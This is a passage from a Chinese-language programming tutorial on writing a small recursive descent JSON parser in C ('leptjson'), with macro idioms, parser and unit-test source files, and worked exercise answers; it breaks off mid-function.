class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M() a(); b()</span></span><br><span class="line"><span class="keyword">if</span> (cond)</span><br><span class="line">    M();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    c();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 预处理后 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cond)</span><br><span class="line">    a(); b(); <span class="comment">/* b(); 在 if 之外     */</span></span><br><span class="line"><span class="keyword">else</span>          <span class="comment">/* &lt;- else 缺乏对应 if */</span></span><br><span class="line">    c();</span><br></pre></td></tr></table></figure><p>只用 <code>&#123; &#125;</code> 也不行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M() &#123; a(); b(); &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 预处理后 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cond)</span><br><span class="line">    &#123; a(); b(); &#125;; <span class="comment">/* 最后的分号代表 if 语句结束 */</span></span><br><span class="line"><span class="keyword">else</span>               <span class="comment">/* else 缺乏对应 if */</span></span><br><span class="line">    c();</span><br></pre></td></tr></table></figure><p>用 do while 就行了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M() do &#123; a(); b(); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 预处理后 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cond)</span><br><span class="line">    <span class="keyword">do</span> &#123; a(); b(); &#125; <span class="keyword">while</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    c();</span><br></pre></td></tr></table></figure><h1 id="五、实现解析器"><a href="#五、实现解析器" class="headerlink" title="五、实现解析器"></a>五、实现解析器</h1><p>首先为了减少解析函数之间传递多个参数，我们把这些数据都放进一个 <code>lept_context</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* json;</span><br><span class="line">&#125;lept_context;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 提示：这里应该是 JSON-text = ws value ws */</span></span><br><span class="line"><span class="comment">/* 以下实现没处理最后的 ws 和 LEPT_PARSE_ROOT_NOT_SINGULAR */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lept_parse</span><span class="params">(lept_value* v, <span class="keyword">const</span> <span class="keyword">char</span>* json)</span> </span>&#123;</span><br><span class="line">    lept_context c;</span><br><span class="line">    assert(v != <span class="literal">NULL</span>);</span><br><span class="line">    c.json = json;</span><br><span class="line">    v-&gt;type = LEPT_NULL;</span><br><span class="line">    lept_parse_whitespace(&amp;c);</span><br><span class="line">    <span class="keyword">return</span> lept_parse_value(&amp;c, v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>暂时我们只储存 json 字符串当前位置，之后的单元我们需要加入更多内容。</p><p>若 <code>lept_parse()</code> 失败，会把 <code>v</code> 设为 <code>null</code> 类型，所以这里先把它设为 <code>null</code>，让 <code>lept_parse_value()</code> 写入解析出来的根值。</p><p>给下面内容做的名词解释：</p><ol><li><p><a href="https://www.wikiwand.com/zh-hans/%E9%80%92%E5%BD%92%E4%B8%8B%E9%99%8D%E8%A7%A3%E6%9E%90%E5%99%A8">递归下降解析器</a>（recursive descent parser）</p><p>一种自上而下的解析器（<a href="https://www.wikiwand.com/en/Top-down_parsing">Top-down parsing</a>），由一组<a href="https://www.wikiwand.com/zh-hans/%E4%BA%92%E9%80%92%E5%BD%92">相互递归</a>的程序（或等价的非递归程序）构建而成，其中每个程序都实现了文法中的一个<a href="https://www.wikiwand.com/zh-hans/%E7%B5%82%E7%B5%90%E7%AC%A6%E8%88%87%E9%9D%9E%E7%B5%82%E7%B5%90%E7%AC%A6">非终结符</a>。</p></li><li><p><a href>分词器</a>（tokenizer）</p><p>按照规则将文本切分为单词的工具。</p><p><img src="/2021/Make-a-JSON-parser-1/1438655-20180728162354187-296980561.jpg" alt="分词器流程图"></p></li></ol><p>leptjson 是一个手写的<strong>递归下降解析器</strong>。由于 JSON 语法特别简单，我们不需要写<strong>分词器</strong>，只需检测下一个字符，便可以知道它是哪种类型的值，然后调用相关的分析函数。对于完整的 JSON 语法，跳过空白后，只需检测当前字符：</p><ul><li>n ➔ null</li><li>t ➔ true</li><li>f ➔ false</li><li>“ ➔ string</li><li>0-9/- ➔ number</li><li>[ ➔ array</li><li>{ ➔ object</li></ul><p>所以，我们可以按照 JSON 语法一节的 EBNF 简单翻译成解析函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT(c, ch) do &#123; assert(*c-&gt;json == (ch)); c-&gt;json++; &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ws = *(%x20 / %x09 / %x0A / %x0D) */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lept_parse_whitespace</span><span class="params">(lept_context* c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p = c-&gt;json;</span><br><span class="line">    <span class="keyword">while</span> (*p == <span class="string">&#x27; &#x27;</span> || *p == <span class="string">&#x27;\t&#x27;</span> || *p == <span class="string">&#x27;\n&#x27;</span> || *p == <span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">        p++;</span><br><span class="line">    c-&gt;json = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* null  = &quot;null&quot; */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_null</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    EXPECT(c, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;json[<span class="number">0</span>] != <span class="string">&#x27;u&#x27;</span> || c-&gt;json[<span class="number">1</span>] != <span class="string">&#x27;l&#x27;</span> || c-&gt;json[<span class="number">2</span>] != <span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    c-&gt;json += <span class="number">3</span>;</span><br><span class="line">    v-&gt;type = LEPT_NULL;</span><br><span class="line">    <span class="keyword">return</span> LEPT_PARSE_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* value = null / false / true */</span></span><br><span class="line"><span class="comment">/* 提示：下面代码没处理 false / true，将会是练习之一 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_value</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (*c-&gt;json) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:  <span class="keyword">return</span> lept_parse_null(c, v);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>: <span class="keyword">return</span> LEPT_PARSE_EXPECT_VALUE;</span><br><span class="line">        <span class="keyword">default</span>:   <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于 <code>lept_parse_whitespace()</code> 是不会出现错误的，返回类型为 <code>void</code>。其它的解析函数会返回错误码，传递至顶层。</p><h1 id="六、本单元文件完整内容"><a href="#六、本单元文件完整内容" class="headerlink" title="六、本单元文件完整内容"></a>六、本单元文件完整内容</h1><p>本单元结束项目三个文件的内容：</p><p>leptjson.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LEPTJSON_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEPTJSON_H__</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123; LEPT_NULL, LEPT_FALSE, LEPT_TRUE, LEPT_NUMBER, LEPT_STRING, LEPT_ARRAY, LEPT_OBJECT &#125; lept_type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    lept_type type;</span><br><span class="line">&#125;lept_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> &#123;</span><br><span class="line">    LEPT_PARSE_OK = <span class="number">0</span>,</span><br><span class="line">    LEPT_PARSE_EXPECT_VALUE,</span><br><span class="line">    LEPT_PARSE_INVALID_VALUE,</span><br><span class="line">    LEPT_PARSE_ROOT_NOT_SINGULAR</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lept_parse</span><span class="params">(lept_value* v, <span class="keyword">const</span> <span class="keyword">char</span>* json)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">lept_type <span class="title">lept_get_type</span><span class="params">(<span class="keyword">const</span> lept_value* v)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* LEPTJSON_H__ */</span></span></span><br></pre></td></tr></table></figure><p>leptjson.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;leptjson.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;  /* assert() */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  /* NULL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT(c, ch)       do &#123; assert(*c-&gt;json == (ch)); c-&gt;json++; &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* json;</span><br><span class="line">&#125;lept_context;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lept_parse_whitespace</span><span class="params">(lept_context* c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p = c-&gt;json;</span><br><span class="line">    <span class="keyword">while</span> (*p == <span class="string">&#x27; &#x27;</span> || *p == <span class="string">&#x27;\t&#x27;</span> || *p == <span class="string">&#x27;\n&#x27;</span> || *p == <span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">        p++;</span><br><span class="line">    c-&gt;json = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_null</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    EXPECT(c, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;json[<span class="number">0</span>] != <span class="string">&#x27;u&#x27;</span> || c-&gt;json[<span class="number">1</span>] != <span class="string">&#x27;l&#x27;</span> || c-&gt;json[<span class="number">2</span>] != <span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    c-&gt;json += <span class="number">3</span>;</span><br><span class="line">    v-&gt;type = LEPT_NULL;</span><br><span class="line">    <span class="keyword">return</span> LEPT_PARSE_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_value</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (*c-&gt;json) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:  <span class="keyword">return</span> lept_parse_null(c, v);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>: <span class="keyword">return</span> LEPT_PARSE_EXPECT_VALUE;</span><br><span class="line">        <span class="keyword">default</span>:   <span class="keyword">return</span> LEPT_PARSE_INVALID_VALUE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lept_parse</span><span class="params">(lept_value* v, <span class="keyword">const</span> <span class="keyword">char</span>* json)</span> </span>&#123;</span><br><span class="line">    lept_context c;</span><br><span class="line">    assert(v != <span class="literal">NULL</span>);</span><br><span class="line">    c.json = json;</span><br><span class="line">    v-&gt;type = LEPT_NULL;</span><br><span class="line">    lept_parse_whitespace(&amp;c);</span><br><span class="line">    <span class="keyword">return</span> lept_parse_value(&amp;c, v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">lept_type <span class="title">lept_get_type</span><span class="params">(<span class="keyword">const</span> lept_value* v)</span> </span>&#123;</span><br><span class="line">    assert(v != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> v-&gt;type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;leptjson.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> main_ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> test_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> test_pass = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_EQ_BASE(equality, expect, actual, format) \</span></span><br><span class="line">    <span class="keyword">do</span> &#123;\</span><br><span class="line">        test_count++;\</span><br><span class="line">        <span class="keyword">if</span> (equality)\</span><br><span class="line">            test_pass++;\</span><br><span class="line">        <span class="keyword">else</span> &#123;\</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s:%d: expect: &quot;</span> format <span class="string">&quot; actual: &quot;</span> format <span class="string">&quot;\n&quot;</span>, __FILE__, __LINE__, expect, actual);\</span><br><span class="line">            main_ret = <span class="number">1</span>;\</span><br><span class="line">        &#125;\</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_EQ_INT(expect, actual) EXPECT_EQ_BASE((expect) == (actual), expect, actual, <span class="meta-string">&quot;%d&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse_null</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lept_value v;</span><br><span class="line">    v.type = LEPT_FALSE;</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_OK, lept_parse(&amp;v, <span class="string">&quot;null&quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_NULL, lept_get_type(&amp;v));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse_expect_value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lept_value v;</span><br><span class="line"></span><br><span class="line">    v.type = LEPT_FALSE;</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_EXPECT_VALUE, lept_parse(&amp;v, <span class="string">&quot;&quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_NULL, lept_get_type(&amp;v));</span><br><span class="line"></span><br><span class="line">    v.type = LEPT_FALSE;</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_EXPECT_VALUE, lept_parse(&amp;v, <span class="string">&quot; &quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_NULL, lept_get_type(&amp;v));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse_invalid_value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lept_value v;</span><br><span class="line">    v.type = LEPT_FALSE;</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_INVALID_VALUE, lept_parse(&amp;v, <span class="string">&quot;nul&quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_NULL, lept_get_type(&amp;v));</span><br><span class="line"></span><br><span class="line">    v.type = LEPT_FALSE;</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_INVALID_VALUE, lept_parse(&amp;v, <span class="string">&quot;?&quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_NULL, lept_get_type(&amp;v));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse_root_not_singular</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lept_value v;</span><br><span class="line">    v.type = LEPT_FALSE;</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_ROOT_NOT_SINGULAR, lept_parse(&amp;v, <span class="string">&quot;null x&quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_NULL, lept_get_type(&amp;v));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test_parse_null();</span><br><span class="line">    test_parse_expect_value();</span><br><span class="line">    test_parse_invalid_value();</span><br><span class="line">    test_parse_root_not_singular();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test_parse();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d/%d (%3.2f%%) passed\n&quot;</span>, test_pass, test_count, test_pass * <span class="number">100.0</span> / test_count);</span><br><span class="line">    <span class="keyword">return</span> main_ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="七、总结与练习答案"><a href="#七、总结与练习答案" class="headerlink" title="七、总结与练习答案"></a>七、总结与练习答案</h1><p>本文介绍了如何配置一个编程环境，单元测试的重要性，和一个 JSON 解析器的子集实现。</p><ol><li>补充leptjson.c的内容，使关于 <code>LEPT_PARSE_ROOT_NOT_SINGULAR</code> 的单元测试成功，若 json 在一个值之后，空白之后还有其它字符，则要返回 <code>LEPT_PARSE_ROOT_NOT_SINGULAR</code>。</li></ol><p>单元测试失败的是这一行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPECT_EQ_INT(LEPT_PARSE_ROOT_NOT_SINGULAR, lept_parse(&amp;v, <span class="string">&quot;null x&quot;</span>));</span><br></pre></td></tr></table></figure><p>我们从 JSON 语法发现，JSON 文本应该有 3 部分：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JSON</span>-<span class="type">text</span> = ws <span class="keyword">value</span> ws</span><br></pre></td></tr></table></figure><p>但原来的 <code>lept_parse()</code> 只处理了前两部分。我们只需要加入第三部分，解析空白，然后检查 JSON 文本是否完结：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lept_parse</span><span class="params">(lept_value* v, <span class="keyword">const</span> <span class="keyword">char</span>* json)</span> </span>&#123;</span><br><span class="line">    lept_context c;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    assert(v != <span class="literal">NULL</span>);</span><br><span class="line">    c.json = json;</span><br><span class="line">    v-&gt;type = LEPT_NULL;</span><br><span class="line">    lept_parse_whitespace(&amp;c);</span><br><span class="line">    <span class="keyword">if</span> ((ret = lept_parse_value(&amp;c, v)) == LEPT_PARSE_OK) &#123;</span><br><span class="line">        lept_parse_whitespace(&amp;c);</span><br><span class="line">        <span class="keyword">if</span> (*c.json != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">            ret = LEPT_PARSE_ROOT_NOT_SINGULAR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>参考 <code>test_parse_null()</code>，加入 <code>test_parse_true()</code>、<code>test_parse_false()</code> 单元测试。参考 <code>lept_parse_null()</code> 的实现和调用方，解析 true 和 false 值。</li></ol><p>只需参考 <code>test_parse_null()</code> 加入两个测试函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse_true</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lept_value v;</span><br><span class="line">    v.type = LEPT_FALSE;</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_OK, lept_parse(&amp;v, <span class="string">&quot;true&quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_TRUE, lept_get_type(&amp;v));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse_false</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lept_value v;</span><br><span class="line">    v.type = LEPT_TRUE;</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_OK, lept_parse(&amp;v, <span class="string">&quot;false&quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_FALSE, lept_get_type(&amp;v));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test_parse_null();</span><br><span class="line">    test_parse_true();</span><br><span class="line">    test_parse_false();</span><br><span class="line">    test_parse_expect_value();</span><br><span class="line">    test_parse_invalid_value();</span><br><span class="line">    test_parse_root_not_singular();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但要记得在上一级的测试函数 <code>test_parse()</code> 调用这函数，否则会不起作用。还好如果我们记得用 <code>static</code> 修饰这两个函数，编译器会发出警告：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.c:30:13: warning: unused <span class="keyword">function</span> <span class="string">&#x27;test_parse_true&#x27;</span> [-Wunused-function]</span><br><span class="line">static void <span class="function"><span class="title">test_parse_true</span></span>() &#123;</span><br><span class="line">            ^</span><br></pre></td></tr></table></figure><p>参考 <code>lept_parse_null()</code>，再写两个函数，然后在 <code>lept_parse_value</code> 按首字符分派。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_true</span><span class="params">(lept_context* c, lept_value* 